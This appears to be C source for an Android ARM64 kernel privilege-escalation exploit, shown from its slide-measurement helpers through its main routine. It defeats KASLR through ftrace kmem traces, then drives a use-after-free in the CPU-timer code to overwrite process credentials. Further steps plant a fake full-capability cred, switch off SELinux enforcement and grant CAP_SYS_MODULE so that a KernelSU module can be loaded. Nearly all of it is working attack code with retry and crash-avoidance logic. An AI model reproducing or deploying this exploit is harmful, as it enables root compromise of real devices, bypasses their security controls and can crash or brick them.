/* ARM64 6.6+ relocatable kernels use MIN_KIMG_ALIGN = SZ_64K (0x10000). */
#define SLIDE_ALIGN UINT64_C(0x10000)
#define SLIDE_SAMPLES 3

static uint64_t measure_slide_once(void)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint64_t slide = 0;
	struct sigevent ev;
	timer_t id;
	if (!buf)
		return 0;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		free(buf);
		return 0;
	}
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
		timer_delete(id);
	write_file(TRACE "/tracing_on", "0\n");
	/* One 4 KiB page of records is plenty to recover the call site. */
	if (read_raw(buf, 8U << 20, &used, 4096) == 0) {
		uint64_t unaligned_fallback = 0;
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req, cand_slide;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			if (req != GEO_KITIMER_SIZE)
				continue;
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff)
				continue;
			cand_slide = site - TIMER_LINK;
			if (cand_slide & (SLIDE_ALIGN - 1)) {
				if (!unaligned_fallback)
					unaligned_fallback = cand_slide;
				continue;
			}
			slide = cand_slide;
			break;
		}
		if (!slide)
			slide = unaligned_fallback;
	}
	free(buf);
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	return slide;
}

/*
 * A wrong slide turns every later write into a wild kernel pointer, so the
 * value is only accepted when it is 2 MiB aligned and reproducible. Guess
 * once and this stops being a root tool and starts being a brick tool.
 */
static uint64_t measure_slide(void)
{
	uint64_t cand[SLIDE_SAMPLES];
	int n = 0;

	for (int i = 0; i < SLIDE_SAMPLES; i++) {
		uint64_t s = measure_slide_once();
		if (!s) {
			dprintf(STDOUT_FILENO, "[slide] sample %d empty\n", i + 1);
			continue;
		}
		if (s & (SLIDE_ALIGN - 1)) {
			dprintf(STDOUT_FILENO,
				"[slide] sample %d unaligned %#" PRIx64 " -> reject\n",
				i + 1, s);
			continue;
		}
		dprintf(STDOUT_FILENO, "[slide] sample %d %#" PRIx64 "\n",
			i + 1, s);
		cand[n++] = s;
		/* Two agreeing samples are as trustworthy as three. */
		if (n >= 2 && cand[0] == cand[1])
			break;
	}

	if (!n)
		return 0;

	uint64_t best = 0;
	int best_count = 0;
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++)
			if (cand[j] == cand[i])
				c++;
		if (c > best_count) {
			best_count = c;
			best = cand[i];
		}
	}
	if (n >= 2 && best_count < 2) {
		dprintf(STDOUT_FILENO, "[slide] unstable across %d samples\n", n);
		return 0;
	}
	return best;
}

#define SLIDE_CACHE "/data/local/tmp/.yt-slide"

static void boot_id(char *out, size_t cap)
{
	int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	ssize_t n;
	memset(out, 0, cap);
	if (fd < 0)
		return;
	n = read(fd, out, cap - 1);
	close(fd);
	if (n <= 0) {
		out[0] = 0;
		return;
	}
	for (size_t i = 0; i < (size_t)n; i++)
		if (out[i] == '\n')
			out[i] = 0;
}

static uint64_t read_slide_cache(void)
{
	char line[128] = { 0 }, boot[64];
	FILE *f;
	uint64_t s;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "r");
	if (!f)
		return 0;
	if (!fgets(line, sizeof(line), f)) {
		fclose(f);
		return 0;
	}
	fclose(f);
	char *sp = strchr(line, ' ');
	if (!sp)
		return 0;
	*sp = 0;
	if (strcmp(line, boot))
		return 0;
	s = strtoull(sp + 1, NULL, 0);
	if (!s || (s & (SLIDE_ALIGN - 1)))
		return 0;
	return s;
}

static void write_slide_cache(uint64_t s)
{
	char boot[64];
	FILE *f;
	if (!s)
		return;
	boot_id(boot, sizeof(boot));
	f = fopen(SLIDE_CACHE, "w");
	if (!f)
		return;
	fprintf(f, "%s %#" PRIx64 "\n", boot, s);
	fclose(f);
	chmod(SLIDE_CACHE, 0666);
}

static void diag_print_sites(const char *tag, struct diag_site *arr, int n,
			     uint64_t link)
{
	for (int i = 0; i < n; i++) {
		uint64_t implied = arr[i].site - link;
		dprintf(STDOUT_FILENO,
			"[cred-diag] %s_site=%#" PRIx64 " count=%d implied_slide=%#" PRIx64 " aligned=%d\n",
			tag, arr[i].site, arr[i].count, implied,
			(implied & (SLIDE_ALIGN - 1)) == 0);
	}
	if (!n)
		dprintf(STDOUT_FILENO, "[cred-diag] %s_site=none\n", tag);
}

/* Text trace is non-destructive; read it before trace_pipe_raw consumes the
 * ring.  sym-addr may not be available, but when it is the line carries the
 * absolute call site and symbol for a direct slide cross-check. */
static void diag_dump_text_cred(void)
{
	FILE *f = fopen(CPU0_TRACE, "r");
	char line[1024];
	char needle[48];
	int n = 0;
	if (!f) {
		dprintf(STDOUT_FILENO, "[cred-diag] text_trace=open_failed errno=%d\n",
			errno);
		return;
	}
	snprintf(needle, sizeof(needle), "bytes_req=%llu",
		 (unsigned long long)GEO_CRED_SIZE);
	while (fgets(line, sizeof(line), f)) {
		if (!strstr(line, "kmem_cache_alloc") || !strstr(line, needle))
			continue;
		line[strcspn(line, "\r\n")] = 0;
		dprintf(STDOUT_FILENO, "[cred-diag] text=%s\n", line);
		if (++n >= 6)
			break;
	}
	fclose(f);
	if (!n)
		dprintf(STDOUT_FILENO, "[cred-diag] text=no_cred_alloc_lines\n");
}

/* Read-only probe: arm the same kmem trace, mint a child cred, collect one
 * timer allocation and one cred allocation, then report the observed call
 * sites with their implied slides.  Never writes creds and never starts the
 * UAF. */
static int diag_cred_once(void)
{
	struct pollfd pfd;
	char ack;
	uint64_t ptrs[1];
	int seen = 0, st = 0;
	uint64_t timer_site = slide_addr(TIMER_LINK);

	g_cred_site = slide_addr(CRED_LINK);
	dprintf(STDOUT_FILENO,
		"[cred-diag] slide=%#" PRIx64 " expected_cred_site=%#" PRIx64
		" expected_timer_site=%#" PRIx64 "\n",
		g_slide, g_cred_site, timer_site);
	if (write_file(TRACE "/buffer_size_kb", "4096\n")) {
		dprintf(STDOUT_FILENO, "[cred-diag] buffer_size failed errno=%d\n",
			errno);
		return 1;
	}
	if (write_file(TRACE "/options/sym-addr", "1\n"))
		dprintf(STDOUT_FILENO, "[cred-diag] sym_addr unsupported errno=%d\n",
			errno);
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		dprintf(STDOUT_FILENO, "[cred-diag] trace arm failed errno=%d\n",
			errno);
		return 1;
	}
	dprintf(STDOUT_FILENO, "[cred-diag] trigger_armed=%d\n",
		cred_trigger_armed());
	{
		struct sigevent ev;
		timer_t id;
		memset(&ev, 0, sizeof(ev));
		ev.sigev_notify = SIGEV_NONE;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
			timer_delete(id);
		else
			dprintf(STDOUT_FILENO, "[cred-diag] timer_create errno=%d\n",
				errno);
	}
	if (pipe(g_wake) || pipe(g_report))
		return 1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return 1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 3000) <= 0 || read(g_report[0], &ack, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred-diag] mint ack missing pid=%d\n",
			g_cred_child_pid);
		st = 1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	diag_dump_text_cred();
	(void)collect_site_pid(g_cred_site, GEO_CRED_SIZE,
			       (int)g_cred_child_pid, ptrs, 0, &seen);
	dprintf(STDOUT_FILENO,
		"[cred-diag] raw_bytes=%zu cred_recs=%d timer_recs=%d expected_hits=%d pid_hits=%d seen=%d\n",
		g_diag_raw, g_diag_cred_size_recs, g_diag_timer_size_recs,
		g_diag_expected_hits, g_diag_pid_hits, seen);
	diag_print_sites("cred", g_diag_cred_sites, g_diag_cred_nsites,
			 CRED_LINK);
	diag_print_sites("timer", g_diag_timer_sites, g_diag_timer_nsites,
			 TIMER_LINK);
	disarm();
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	{
		int rc;
		alarm(3);
		while ((rc = waitpid(g_cred_child_pid, &st, 0)) < 0 && errno == EINTR)
			;
		alarm(0);
		if (rc == 0 || (rc < 0 && errno == EINTR)) {
			kill(g_cred_child_pid, SIGKILL);
			waitpid(g_cred_child_pid, &st, 0);
		}
	}
	return 0;
}

static long mem_available_kb(void)
{
	char line[128];
	long v = 0;
	FILE *f = fopen("/proc/meminfo", "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "MemAvailable:", 13)) {
			v = strtol(line + 13, NULL, 10);
			break;
		}
	}
	fclose(f);
	return v;
}

static int selinux_enforcing(void)
{
	char b = '?';
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (read(fd, &b, 1) <= 0)
			b = '?';
		close(fd);
	}
	return b;
}

/* SELinux hides available_events from shell; stat the event file instead. */
static int trace_event_available(const char *name)
{
	char path[256];
	struct stat st;
	snprintf(path, sizeof(path), TRACE "/events/%s/enable", name);
	return stat(path, &st) == 0;
}

/* Read-only environment report; touches nothing that can fault. */
static int preflight(int quick)
{
	struct utsname u;
	long ps = sysconf(_SC_PAGESIZE);
	int cpus = cpu_count();
	long avail = mem_available_kb();
	int event = trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") == 0;
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	int trig = access(TRIGGER, W_OK) == 0;
	int ksu = access("/system/bin/su", X_OK) == 0;
	uint64_t s = 0;
	/* Quick mode answers "is this kernel shaped right" without paying the
	   trace round-trip; the main path measures and caches the real value. */
	if (!quick) {
		/* The trace reader only drains cpu0, so sampling must be pinned there. */
		pin_cpu(0);
		s = measure_slide();
		if (s)
			write_slide_cache(s);
	}
	int align_ok = s && !(s & (SLIDE_ALIGN - 1));
	int rc;
	const char *verdict;
	if (ps != 4096 || !event || !trig) {
		rc = 2;
		verdict = "blocked";
	} else if (quick || align_ok) {
		rc = 0;
		verdict = "ok";
	} else {
		rc = 3;
		verdict = "inconclusive";
	}
	uname(&u);
	printf("{\"uname\":\"%s\",\"build_target\":\"%s\",\"page_size\":%ld,\"cpus\":%d,"
	       "\"mem_avail_kb\":%ld,\"tracefs\":%d,\"trigger\":%d,"
	       "\"event\":%d,\"selinux_enforce\":\"%c\",\"ksu\":%d,"
	       "\"slide\":\"%#" PRIx64 "\",\"slide_aligned\":%d,"
	       "\"verdict\":\"%s\"}\n",
	       u.release, TARGET_KERNEL, ps, cpus, avail, event && trig, trig, event,
	       selinux_enforcing(), ksu, s, align_ok, verdict);
	return rc;
}

int main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	if (argc > 1 && (!strcmp(argv[1], "mintwait") ||
			 !strcmp(argv[1], "mintwait-rootd")))
		return mintwait_main(!strcmp(argv[1], "mintwait-rootd"));
	/* Warm the log mirror and the scanner buffers before any plant; the
	 * reclaim window must not fault new anonymous pages.  The exec'd victim
	 * (--exec-ok) and the mintwait child skip this on purpose: a 12 MiB
	 * memset in the exec race would perturb the very slab we reclaim. */
	{
		const char *sl = getenv("PC98260_SYNC_LOG");
		if (sl && *sl)
			g_sync_fd = open(sl, O_WRONLY | O_CREAT | O_APPEND | O_SYNC,
					 0644);
	}
	unproven_marker_prune_stale();
	trace_buf_prewarm();
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
	}
	sigaction(SIGALRM, &action, NULL);
	int check_only = 0, quick = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--check"))
			check_only = 1;
		else if (!strcmp(argv[i], "--quick"))
			quick = 1;
		else if (!strcmp(argv[i], "--no-real-cred"))
			g_no_real_cred = 1;
		else if (!strcmp(argv[i], "--no-selftest"))
			g_no_selftest = 1;
		else if (!strcmp(argv[i], "--diag-cred"))
			g_diag_cred = 1;
		else if (!strcmp(argv[i], "--trace-selftest"))
			g_trace_selftest = 1;
	}
	if (getenv("PC98260_DIAG_CRED"))
		g_diag_cred = 1;
	if (g_trace_selftest)
		return trace_selftest();
	if (check_only)
		return preflight(quick);
	/* A failed UAF deliberately leaves its victim/helper zombies unreaped.
	 * Without a child subreaper, an intermediate child exiting hands those
	 * zombies directly to init; init's wait4() then enters the corrupted
	 * posix_cpu_timers tree and panics.  Adopt them here instead, while this
	 * parent stays parked for the rest of the boot.  Fail closed before any
	 * fork if the kernel cannot provide that guarantee. */
	if (prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)) {
		dprintf(STDERR_FILENO,
			"[lifetime] PR_SET_CHILD_SUBREAPER failed errno=%d\n", errno);
		return 9;
	}
	/* A zygote restart must remain available for Zygisk/LSPosed.  Ordinary
	 * session teardown signals must not kill the page-holding parent and
	 * reparent its unsafe zombies to init.  SIGKILL cannot be made safe here;
	 * the external all-userspace ksud soft-reboot remains a different path. */
	(void)signal(SIGHUP, SIG_IGN);
	(void)signal(SIGTERM, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);
	(void)signal(SIGQUIT, SIG_IGN);
	dprintf(STDOUT_FILENO, "[lifetime] subreaper=1 parent=%d\n", getpid());
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	if (!g_slide)
		g_slide = read_slide_cache();
	if (!g_slide) {
		g_slide = measure_slide();
		dprintf(STDOUT_FILENO, "[slide] measured %#" PRIx64 "\n", g_slide);
		if (!g_slide) {
			dprintf(STDOUT_FILENO,
				"[slide] measurement did not converge, refusing to run\n");
			return 7;
		}
		write_slide_cache(g_slide);
	} else {
		dprintf(STDOUT_FILENO, "[slide] cached %#" PRIx64 "\n", g_slide);
	}
	if (g_diag_cred)
		return diag_cred_once();
	slab_task_objsize();
	{
		const char *budget = getenv("PC98260_BUDGET_S");
		int secs = budget ? atoi(budget) : 180;
		g_deadline = time(NULL) + (secs > 0 ? secs : 180);
	}
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	/* PORT: 上一轮若被 kill / panic，disarm() 没机会跑，会留下
	 * 16 MB buffer + 开着的 kmem 事件。无条件先复位一次。 */
	disarm();
	if (write_file(TRACE "/buffer_size_kb", "4096\n")) {
		disarm();
		return 1;
	}
	if (g_no_real_cred) {
		/* Explicit fake-cred branch.  Keep the proven task->cred installation,
		 * its cred/SELinux/NONE tile layout and rootd handoff; do not fall
		 * through into the real-cred mint/cap/direct-finit path. */
		dprintf(STDOUT_FILENO, "[mode] fake-cred (rootd + manager late-load)\n");
		if (leak_task()) {
			dprintf(STDOUT_FILENO, "[task] leak failed\n");
			disarm();
			return 5;
		}
		if (!g_no_selftest && !g_selftest_cred) {
			dprintf(STDOUT_FILENO,
				"[selftest] no cred alloc at call_site=%#" PRIx64
				" -- constants suspect, refusing to run\n", g_cred_site);
			disarm();
			return 8;
		}
		dprintf(STDOUT_FILENO, "[selftest] cred call_site ok (%d samples)\n",
			g_selftest_cred);
		/* fake-cred installs a page-local full-cap cred; it does not use
		 * leak_real_cred().  The earlier real-cred-only tile here caused
		 * both the 0x8 panic (uninitialized target) and rootd EACCES. */
		g_plant_cred = 1;
		/* The tile changes the real uid/gid.  euid stays 2000 until the
		 * mintwait child performs setuid(0) during the rootd/KSU handoff;
		 * requiring euid==0 here made every successful plant loop forever. */
		int rooted = 0;
		int cand_n = g_ntasks > 0 ? g_ntasks : 1;
		int max_attempts = env_int("PC98260_MAX_ATTEMPTS", 12, 1, 12);
		for (int attempt = 1; attempt <= max_attempts && !rooted; attempt++) {
			unsigned uid = 1, euid = 1;
			if (past_deadline()) {
				dprintf(STDOUT_FILENO,
					"[uaf] budget exhausted at attempt %d; holding zombie\n",
					attempt);
				break;
			}
			int fixed_uid = -1, fixed_suid = -1;
			if (g_ntasks)
				g_task = g_tasks[(attempt - 1) % g_ntasks];
			dprintf(STDOUT_FILENO, "[cred] attempt %d/%d task=%#" PRIx64 "\n",
				attempt, max_attempts, g_task);
			g_plant_cred = 1;
			if (one_uaf(0))
				continue;
			g_plant_cred = 0;
			g_fake_installed = 1;
			dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
			if (ask_child(&uid, &euid) == 0 && uid == 0) {
				rooted = 1;
				break;
			}
			if (g_ntasks > 1 && attempt <= cand_n)
				continue;
			for (int i = 0; i < 3 && fixed_uid; i++)
				fixed_uid = one_uaf(g_cred_kva + 8);
			for (int i = 0; i < 3 && fixed_suid; i++)
				fixed_suid = one_uaf(g_cred_kva + 16);
			if (ask_child(&uid, &euid) == 0 && uid == 0)
				rooted = 1;
			else if (uid == 1 && euid == 1)
				dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
			else
				dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
		}
		if (!rooted && !getenv("PC98260_NO_FALLBACK")) {
			uint64_t sel = slide_addr(SELINUX_LINK) - 7;
			g_plant_cred = 0;
			for (int i = 1; i <= 4 && !rooted; i++) {
				char buf[8] = { 0 };
				int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
				if (fd >= 0) {
					if (read(fd, buf, 1) < 0)
						buf[0] = 0;
					close(fd);
				}
				if (buf[0] == '0')
					break;
				dprintf(STDOUT_FILENO, "[selinux] fallback %d/4 target=%#"
					PRIx64 "\n", i, sel);
				if (!one_uaf(sel))
					read_enforce();
			}
			g_plant_cred = 1;
		}
		/* --no-real-cred deliberately keeps this branch fake-only: no second
		 * real_cred installation and no real-cred cap/direct-finit stage.
		 * Never sweep after a successful fake plant; a failed attempt may
		 * still own an armed zombie and a fresh sweep can reap it. */
		if (!rooted)
			victim_sweep();
		victim_summary();
		if (!rooted) {
		int _open = 0;
		for (int _i = 0; _i < g_nvic; _i++)
			if (g_vic[_i].state == V_OPEN ||
			    g_vic[_i].state == V_UNPROVEN)
				_open++;
		if (_open == 0 && !g_fake_installed) {
			/* Zero-residual exit (Shark v2.4): every armed victim was
			 * reaped during the attempts or the sweep, and no fake-cred
			 * page survives.  Unlink the guard marker and exit without
			 * a holder so the runner may retry in the same boot. */
			unproven_marker_sync();
			dprintf(STDOUT_FILENO,
				"[uaf] zero-residual exit victims=%d\n", g_nvic);
			dprintf(STDOUT_FILENO,
				"ZERO_RESIDUAL=1 reason=no_armed_victims\n");
			fflush(stdout);
			native_state("NO_ROOT");
			_exit(13);
		}

			dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
			native_state("NO_ROOT");
			victim_watch_forever();
		}
		dprintf(STDOUT_FILENO, "[cred] child=%d holding fake-cred pages\n",
			g_cred_child_pid);
		start_child_ksu();
		/* Success path: the fake cred and every unresolved victim page are
		 * held by this parent until reboot.  Streaming more trace scans
		 * cannot release them; park without touching tracefs. */
		victim_park_hold_pages();
	}
	dprintf(STDOUT_FILENO, "[mode] real-cred (separate cap + direct-finit)\n");
	if (leak_real_cred()) {
		dprintf(STDOUT_FILENO, "[cred] real cred leak failed\n");
		disarm();
		return 5;
	}
	/* PORT (self-test): 若一次强制 cred 分配都没在预期 call site 出现，
	 * 说明 LINK_ALLOC_CRED / slide 对不上。宁可拒绝，也不要去触发 UAF
	 * —— 本机 PANIC_ON_OOPS=y + PANIC_TIMEOUT=-1，猜错就是死机。 */
	if (!g_no_selftest && !g_selftest_cred) {
		dprintf(STDOUT_FILENO,
			"[selftest] no cred alloc at call_site=%#" PRIx64
			" -- constants suspect, refusing to run\n", g_cred_site);
		disarm();
		return 8;
	}
	dprintf(STDOUT_FILENO, "[selftest] cred call_site ok (%d samples)\n",
		g_selftest_cred);
	/* real-cred: one UAF zeroes the child's REAL cred uid/gid (PLANT_ZERO)
	 * and clears selinux enforce.  No fake page, no uid-repair pass, no
	 * real_cred second hop -- cred == real_cred the whole time. */
	g_plant_cred = 1;
	int rooted = 0;
	int max_attempts = env_int("PC98260_MAX_ATTEMPTS", 12, 1, 12);
	for (int attempt = 1; attempt <= max_attempts && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		if (past_deadline()) {
			dprintf(STDOUT_FILENO,
				"[uaf] budget exhausted at attempt %d; holding zombie\n",
				attempt);
			break;
		}
		dprintf(STDOUT_FILENO, "[cred] attempt %d/%d real=%#" PRIx64 "\n",
			attempt, max_attempts, g_cred_kva);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		/* real-cred writes uid/gid=0 only; euid is raised by the child's
		 * setuid(0) during delivery, so uid==0 alone proves the write. */
		if (ask_child(&uid, &euid) == 0 && uid == 0) {
			rooted = 1;
			break;
		}
		if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted && !getenv("PC98260_NO_FALLBACK")) {
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		g_plant_cred = 0;
		for (int i = 1; i <= 4 && !rooted; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0')
				break;
			dprintf(STDOUT_FILENO, "[selinux] fallback %d/4 target=%#"
				PRIx64 "\n", i, sel);
			if (!one_uaf(sel))
				read_enforce();
		}
		g_plant_cred = 1;
	}
	if (!rooted)
		victim_sweep();
	victim_summary();
	if (!rooted) {
		int _open = 0;
		for (int _i = 0; _i < g_nvic; _i++)
			if (g_vic[_i].state == V_OPEN ||
			    g_vic[_i].state == V_UNPROVEN)
				_open++;
		if (_open == 0 && !g_fake_installed) {
			/* Zero-residual exit (Shark v2.4): every armed victim was
			 * reaped during the attempts or the sweep, and no fake-cred
			 * page survives.  Unlink the guard marker and exit without
			 * a holder so the runner may retry in the same boot. */
			unproven_marker_sync();
			dprintf(STDOUT_FILENO,
				"[uaf] zero-residual exit victims=%d\n", g_nvic);
			dprintf(STDOUT_FILENO,
				"ZERO_RESIDUAL=1 reason=no_armed_victims\n");
			fflush(stdout);
			native_state("NO_ROOT");
			_exit(13);
		}

		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		native_state("NO_ROOT");
		victim_watch_forever();
	}
	/* real-cred KSU: PLANT_PTR writes a stale node address into the child's
	 * cap_effective; when its bit16 lands, the legal root cred gains
	 * CAP_SYS_MODULE and can finit_module() the KSU module itself.  No fake
	 * cred, no resident rootd.  Verify by reading the child's CapEff. */
	if (rooted && getenv("PC98260_KSU")) {
		int cap_ok = 0;
		/* Keep cap_effective separate from the uid/SELinux reclaim, matching
		 * the fake-cred pass layout and the earlier verified real-cred cap proof. */
		for (int i = 0; i < 8 && !cap_ok && !past_deadline(); i++) {
			unsigned long long ce;
			g_cap_mode = 1;
			g_plant_cred = 1;
			if (one_uaf(0)) {
				g_plant_cred = 0;
				dprintf(STDOUT_FILENO,
					"[ksu] cap attempt %d/8 reclaim failed before verify\n", i + 1);
				continue;
			}
			g_plant_cred = 0;
			ce = child_capeff();
			dprintf(STDOUT_FILENO,
				"[ksu] cap plant %d/8 CapEff=%#llx bit16=%d\n",
				i + 1, ce, (int)((ce >> 16) & 1));
			if (ce & 0x10000ULL)
				cap_ok = 1;
		}
		g_cap_mode = 0;
		dprintf(STDOUT_FILENO, "[ksu] cap_effective %s\n",
			cap_ok ? "has CAP_SYS_MODULE" : "plant did not land bit16");
		if (!cap_ok) {
			/* Loading the KSU LKM now would only return EPERM.  Keep the
			 * page-holding parent and report a terminal, actionable error. */
			dprintf(STDOUT_FILENO,
				"[ksu] FAIL=cap_sys_module_not_achieved; finit blocked\n");
			victim_watch_forever();
		}
	}
	/* real-cred delivery: child setuid(0) -> standard root process. */
	dprintf(STDOUT_FILENO, "[cred] real-cred rooted, child=%d\n", g_cred_child_pid);
	start_child_ksu();
	victim_finish_or_watch();
}
